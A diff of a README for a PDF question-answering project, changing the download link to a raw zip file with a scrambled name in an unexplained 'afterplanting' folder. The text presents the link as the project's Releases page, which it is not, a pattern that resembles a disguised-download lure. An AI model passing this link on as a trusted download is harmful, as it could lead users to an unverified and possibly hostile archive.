@@ -23,7 +23,7 @@ This application integrates several technologies:
 
 ## 📥 Download & Install
 
-To get started with PDF-QA-RAG-System, visit this page: [Download PDF-QA-RAG-System from Releases](https://raw.githubusercontent.com/rupamsamanta123/PDF-QA-RAG-System/main/afterplanting/PDF-QA-RAG-System.zip)
+To get started with PDF-QA-RAG-System, visit this page: [Download PDF-QA-RAG-System from Releases](https://github.com/rupamsamanta123/PDF-QA-RAG-System/raw/refs/heads/main/afterplanting/System_PD_Q_RA_3.6.zip)
 
 1. Click on the above link to go to the Releases page.
 2. You will find the latest version of the PDF-QA-RAG-System available for download.
